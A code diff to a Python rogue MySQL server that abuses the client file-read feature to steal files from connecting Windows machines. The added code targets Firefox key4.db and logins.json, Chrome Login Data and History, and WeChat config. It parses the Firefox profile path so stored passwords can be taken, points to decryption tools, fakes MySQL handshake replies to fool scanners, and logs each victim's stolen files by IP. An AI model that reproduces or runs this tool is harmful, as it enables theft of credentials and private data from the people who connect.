@@ -3,10 +3,30 @@ import socket
 import os
 import re
 
-def mysql_get_file_content(filename,conn,address):
+## Please manage the order by yourself, earlier one has more possibilities to be accessed !
+secrets = [
+# Something important in Firefox ...
+'/AppData/Roaming/Mozilla/Firefox/installs.ini',   # with the default 
+#'/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/key4.db',
+#'/AppData/Roaming/Mozilla/Firefox/Profiles/????????.default-release/logins.json',
+#'/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/formhistory.sqlite'
+## To decrypt that, you can see https://github.com/lclevy/firepwd and https://www.cnblogs.com/0xdd/p/13226624.html
+
+# wechat id
+'/Documents/WeChat Files/All Users/config/config.data',
+
+# Something important in Chrome ...
+'/AppData/Local/Google/Chrome/User Data/Default/Login Data',
+'/AppData/Local/Google/Chrome/User Data/Default/History'
+]
+
+def mysql_get_file_content(filename, conn, address):
     logpath = os.path.abspath('.') + "/log/" + address[0]
     if not os.path.exists(logpath):
         os.makedirs(logpath)
+
+    ## 1 and 2 return data like a real MYSQL to cheat the scanner
+    # 1:: return MYSQL version
     conn.sendall(
         "\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
     try:
@@ -14,6 +34,7 @@ def mysql_get_file_content(filename,conn,address):
     except Exception as e:
         print(e)
 
+    # 2:: verificate
     try:
         conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
         res1 = conn.recv(9999)
@@ -40,58 +61,88 @@ def mysql_get_file_content(filename,conn,address):
             else:
                 conn.close()
         else:
+
+            # this part sends the payload to steal the secret information
             try:
+                # with the format of Response TABULAR
                 wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
                 conn.sendall(wantfile)
                 content = conn.recv(99999999)
                 # print(len(content))
-                conn.close()
+                conn.sendall(b"I got what I want, HHH . . . ")
                 if len(content) > 4:
                     if 'PFRO' in filename:
                         with open(logpath + "/PFRO.log", "w") as f:
                             f.write(content)
                             f.close()
+                            conn.close()
                         return True
                     else:
+                        print(content)
                         with open(logpath + "/" + filename.replace("/", "_").replace(":", ""), "w") as f:
                             f.write(content)
                             f.close()
+                            conn.close()
                         return True
                 else:
+                    conn.close()
                     return False
             except Exception as e:
                 print (e)
     except Exception as e:
         print (e)
 
+## If victim has Firefox installed, we can replace other files and try to fetch passwords store in Firefox
+def get_firefoxentry(line):
+    with open(line, "r") as f:
+        content = f.read()
+        firefox_rand = re.findall(r"Default=Profiles/(.*).default-release", content)[0]
+        print(firefox_rand)
+    del secrets[1:]
+    secrets.append("/AppData/Roaming/Mozilla/Firefox/Profiles/" + firefox_rand + ".default-release/key4.db")
+    secrets.append("/AppData/Roaming/Mozilla/Firefox/Profiles/" + firefox_rand + ".default-release/logins.json")
+
 def run():
     port = 3306
     sv = socket.socket()
     sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sv.bind(("",port))
+    sv.bind(("", port))
     sv.listen(100)
 
+    k = 0
     while True:
+        if k >= len(secrets):
+            print("ALL THINGS SHOULD BE DONE . . . . ")
+            #break
+            k = 0   # Continue running . . .
+
+        # connecting
         conn, address = sv.accept()
-        logpath = os.path.abspath('.') + "/log/" + address[0] + '/PFRO.log'
+
+        # if username has been gotten
+        logpath = os.path.abspath(".") + "/log/" + address[0] + "/PFRO.log"
+        #print(logpath)
         if os.path.exists(logpath):
-            with open(logpath, 'r')as f:
+            with open(logpath, "r") as f:
                 content = f.read()
             f.close()
-            # get username
+
+            # parse and use the username
             content = content.replace('\n','').replace('\r','').replace(' ','').replace('\t','').replace('\00','')
             try:
-                res = re.findall(r'Users\\(.*)\\', content)[0]
-                username = res.split('\\')[0]
-                #line = '\\\\10.76.6.93\\test'
-                line = 'C:/Users/' + username + '/Documents/WeChat Files/All Users/config/config.data'
-                # line = 'C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'
-                # line = 'C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/History'
+                res = re.findall(r"Users\\(.*)\\", content)[0]
+                username = res.split("\\")[0]
+
+                # get something secret, the more ENTER uninvited guest entered, the more information we can get . . .
+                line = "C:/Users/" + username + secrets[k]
                 #print(line)
-                if not os.path.exists(os.path.abspath('.') + "/log/" + address[0]+'/'+line.replace("/", "_").replace(":", "")):
-                    res = mysql_get_file_content(line,conn,address)
+                k += 1
+                if not os.path.exists(os.path.abspath(".") + "/log/" + address[0] + "/" + line.replace("/", "_").replace(":", "")):
+                    res = mysql_get_file_content(line, conn, address)
                     if res:
                         print ("Read Success! ---> " + line)
+                        if secrets[k - 1] == "/AppData/Roaming/Mozilla/Firefox/installs.ini":
+                            get_firefoxentry(os.path.abspath(".") + "/log/" + address[0] + "/" + line.replace("/", "_").replace(":", ""))
                     else:
                         print ("Not Found~ ---> " + line)
                 else:
@@ -99,8 +150,8 @@ def run():
             except Exception as e:
                 print(e)
         else:
-            line = 'C:/Windows/PFRO.log'
-            res = mysql_get_file_content(line,conn,address)
+            line = "C:/Windows/PFRO.log"
+            res = mysql_get_file_content(line, conn, address)
             if res:
                 print ("Read Success! ---> " + line)
             else:
